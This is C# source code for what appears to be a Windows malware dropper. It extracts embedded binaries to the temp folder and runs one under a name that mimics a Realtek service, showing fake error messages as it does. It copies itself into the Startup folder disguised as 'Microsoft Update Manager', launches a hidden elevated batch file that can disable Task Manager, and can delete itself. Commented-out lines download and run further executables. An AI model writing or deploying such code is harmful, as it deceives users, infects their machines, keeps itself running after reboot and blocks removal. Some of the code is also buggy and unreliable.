using System;
using System.IO;
using System.Windows.Forms;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;
using System.Threading;
using System.Management;
using idk;
using System.Reflection;

public class hexify
{
    public static bool IsFileinUse(FileInfo file)
    {
        FileStream stream = null;
        try
        {
            stream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
        }
        catch (IOException)
        {
            return true;
        }
        finally
        {
            if (stream != null)
                stream.Close();
        }
        return false;
    }
    public static void Main()
    {
        vCk_resource.vC();
        if (vCk_resource.vCk == false)
        {
            string Temp = Path.GetTempPath();
            try
            {
                string[] resNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
                foreach (string resName in resNames)
                {
                    resources(resName);
                }
                string license;
                string cfe;
                Process.Start(Temp + "RtkBtManServ.exe", license);
                try 
                {
                    File.Delete(Temp + "CustomEXE.ext");
                    /*new WebClient().DownloadFile("customexelink", Temp + "CustomEXE.ext"); Process.Start(Temp + "CustomEXE.ext"); */ //add support for running file with arguements
                } 
                catch
                {
                    cfe = "Cstm" + new Random().Next(1, 9999999).ToString();
                    while (!File.Exists(Temp + cfe)) cfe = "Cstm" + new Random().Next(1, 9999999).ToString();
                    /*new WebClient().DownloadFile("customexelink", Temp + cfe + ".ext"); Process.Start(Temp + cfe + ".ext"); */ //add support for running file with arguements
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message); //Change to below (on release day?)
                if (e.Message.Contains("RtkBtManServ.exe"))
                {
                    while (IsFileinUse(new FileInfo(Temp + "RtkBtManServ.exe"))); Main();
                }
                MessageBox.Show("An unknown error occured while trying to execute\n.NET Framework 4.6.1 or above might not be installed.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            //av();
            //AMessageBox.Show("Your Desc", "Your Title", MessageBoxButtons.btn, MessageBoxIcon.gaay);
            //Digitallity.Digitallify();
            bool sleep = false;
            if (sleep == true)
            {
                while (File.Exists(Temp + "RtkBtManServ.exe") | IsFileinUse(new FileInfo(Temp + "RtkBtManServ.exe")));
                //Fork.fork();
            }
            //RemoveEXE(); 
        }
        else
        {
            MessageBox.Show("The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", Application.ExecutablePath, MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(0);
        }
    }
    public static void RemoveEXE()
    {
        Process.Start(new ProcessStartInfo()
        {
            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = "cmd.exe"
        });
    }
    public static string sad = null;
    public static void resources(string resource)
    {
        string r = resource.Replace("Properties.Resources.resources", null); 
        string x; 
        if (sad == null) 
        { 
            sad = r; 
            return; 
        }
        else 
        { 
            x = resource.Replace(sad + "Binaries.", ""); 
        }
        if (File.Exists(Path.GetTempPath() + x)) File.Delete(Path.GetTempPath() + x);
        Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
        FileStream fileStream = new FileStream(Path.GetTempPath() + x, FileMode.CreateNew);
        for (int i = 0; i < stream.Length; i++)
            fileStream.WriteByte((byte)stream.ReadByte());
        fileStream.Close();
    }

    public static void av()
    {
        Random rndm = new Random();
        int x = rndm.Next(0, 10000000);
        while (true)
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Update Manager" + x + ".exe"))
            {
                x = rndm.Next(x, x += 1034);
            }
            else
            {
                break;
            }
        }
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Update Manager" + x + ".exe");
        try
        {
            File.Move(Path.GetTempPath() + "whysosad", Path.GetTempPath() + "dav.bat");
            bool _dav = false;
            if (_dav == true)
            {
                string dav = File.ReadAllText(Path.GetTempPath() + "dav.bat");
                dav = dav.Replace("rem gg", @"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
                File.WriteAllText(Path.GetTempPath() + "dav.bat", dav);
            }
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = true;
            psi.WorkingDirectory = Path.GetTempPath();
            psi.FileName = @"dav.bat";
            psi.Verb = "runas";
            Process.Start(psi);
        }
        catch
        {
            MessageBox.Show("Adminstrator permissons are required to continue. Please try again", "", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.UseShellExecute = true;
                psi.WorkingDirectory = Path.GetTempPath();
                psi.FileName = @"dav.bat";
                psi.Verb = "runas";
                Process.Start(psi);
            }
            catch 
            {
                MessageBox.Show("Exiting.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}